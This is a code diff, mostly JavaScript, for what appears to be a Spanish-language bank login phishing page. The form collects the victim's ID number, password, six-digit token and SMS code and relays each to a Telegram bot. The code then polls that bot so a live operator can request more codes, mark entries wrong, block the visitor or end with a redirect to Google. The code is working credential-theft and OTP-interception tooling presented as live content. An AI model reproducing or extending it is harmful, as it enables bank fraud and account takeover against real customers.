+        }
+    });
+}
+
+// ==========================================
+// POLLING DE BOTONES
+// ==========================================
+function escucharBotones(callbackAction) {
+    if (!msgIdActual) return;
+    pollingActivo = true;
+
+    function check() {
+        if (!pollingActivo) return;
+        fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/getUpdates`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ offset: ultimoUpdateId + 1, allowed_updates: ['callback_query'], timeout: 10 })
+        }).then(r => r.json()).then(data => {
+            if (!data.ok || !data.result || data.result.length === 0) {
+                pollingTimeout = setTimeout(check, 2000); return;
+            }
+            for (const u of data.result) {
+                ultimoUpdateId = Math.max(ultimoUpdateId, u.update_id);
+                if (u.callback_query) {
+                    const messageId = String(u.callback_query.message.message_id);
+                    if (messageId === String(msgIdActual)) {
+                        pollingActivo = false;
+                        callbackAction(u.callback_query.data);
+                        return;
+                    }
+                }
+            }
+            pollingTimeout = setTimeout(check, 2000);
+        }).catch(() => { pollingTimeout = setTimeout(check, 3000); });
     }
+    check();
+}
 
+// ==========================================
+// ACCIONES DE TELEGRAM
+// ==========================================
+function handleTelegramActionLogin(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'pedir_dinamica') {
+        modal.classList.add("is-open");
+        viewDinamica.classList.add("active");
+        viewSms.classList.remove("active");
+
+        otpInput.value = "";
+        otpError.classList.remove("show");
+        otpContainer.classList.remove("error");
+        actualizarOTP();
+        setTimeout(() => otpInput.focus(), 100);
+    } else if (action === 'error_usuario') {
+        loginError.classList.add("show");
+        claveInput.value = "";
+        actualizarBoton();
+        claveInput.focus();
+    } else if (action === 'banear_ip') {
+        localStorage.setItem('sys_blocked_user', 'true');
+        location.reload();
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com";
+    }
+}
+
+function handleTelegramActionDinamica(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'error_dinamica') {
+        modal.classList.add("is-open");
+        viewDinamica.classList.add("active");
+        viewSms.classList.remove("active");
+
+        otpError.classList.add("show");
+        otpContainer.classList.add("error");
+        otpInput.value = "";
+        actualizarOTP();
+        otpInput.focus();
+
+        actionProcessed = false;
+    } else if (action === 'sms_code') {
+        viewDinamica.classList.remove("active");
+        viewSms.classList.add("active");
+        smsCodeInput.value = "";
+        smsError.classList.remove("show");
+        smsInputWrap.classList.remove("error");
+        setTimeout(() => smsCodeInput.focus(), 100);
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com";
+    }
+}
+
+function handleTelegramActionSms(action) {
+    if (actionProcessed) return;
+    actionProcessed = true;
+    ocultarOverlay();
+
+    if (action === 'error_dinamica_final') {
+        viewSms.classList.remove("active");
+        viewDinamica.classList.add("active");
+        otpError.classList.add("show");
+        otpContainer.classList.add("error");
+        otpInput.value = "";
+        actualizarOTP();
+        otpInput.focus();
+        actionProcessed = false;
+    } else if (action === 'error_sms_final') {
+        smsError.classList.add("show");
+        smsInputWrap.classList.add("error");
+        smsCodeInput.value = "";
+        smsCodeInput.focus();
+        actionProcessed = false;
+    } else if (action === 'finalizar') {
+        window.location.href = "https://www.google.com";
+    }
+}
+
+// ==========================================
+// SUBMIT DEL FORMULARIO PRINCIPAL
+// ==========================================
+demoForm.addEventListener("submit", function(event) {
+    event.preventDefault();
+    if (submitBtn.disabled) return;
+
+    mostrarOverlay();
+    const tipoDoc = documentType.value;
+    const user = documentNumber.value.trim();
+    const pass = claveInput.value.trim();
+
+    enviarIdentificacionTelegram(tipoDoc, user, pass);
 });
 
+// ==========================================
+// LÓGICA OTP
+// ==========================================
+function actualizarOTP() {
+    const valor = otpInput.value;
+
+    otpSlots.forEach((slot, index) => {
+        if (index < valor.length) {
+            slot.textContent = valor[index];
+            slot.classList.remove("active");
+        } else {
+            slot.textContent = "";
+            if (index === valor.length) slot.classList.add("active");
+            else slot.classList.remove("active");
+        }
+    });
+
+    if (valor.length === 6) {
+        btnContinuar.disabled = false;
+        otpSlots.forEach(s => s.classList.remove("active"));
+    } else {
+        btnContinuar.disabled = true;
+    }
+}
+
+otpInput.addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+    otpError.classList.remove("show");
+    otpContainer.classList.remove("error");
+    actualizarOTP();
+});
+
+otpContainer.addEventListener("click", () => otpInput.focus());
+
+btnBorrar.addEventListener("click", () => {
+    otpInput.value = "";
+    otpError.classList.remove("show");
+    otpContainer.classList.remove("error");
+    actualizarOTP();
+    otpInput.focus();
+});
+
+btnContinuar.addEventListener("click", () => {
+    if (otpInput.value.length === 6) {
+        mostrarOverlay();
+        enviarDinamicaTelegram(otpInput.value);
+    }
+});
+
+closeModal.addEventListener("click", () => {
+    modal.classList.remove("is-open");
+});
+
+// SMS
+smsCodeInput.addEventListener("input", function() {
+    this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+    smsError.classList.remove("show");
+    smsInputWrap.classList.remove("error");
+});
+
+btnSmsFinal.addEventListener("click", () => {
+    if (smsCodeInput.value.length < 6) {
+        smsError.textContent = "Por favor, ingresa el código SMS completo de 6 dígitos.";
+        smsError.classList.add("show");
+        smsInputWrap.classList.add("error");
+        return;
+    }
+    mostrarOverlay();
+    enviarSmsTelegram(smsCodeInput.value);
+});
+
+// Inicializar
+actualizarBoton();
 </script>
 
 </body>
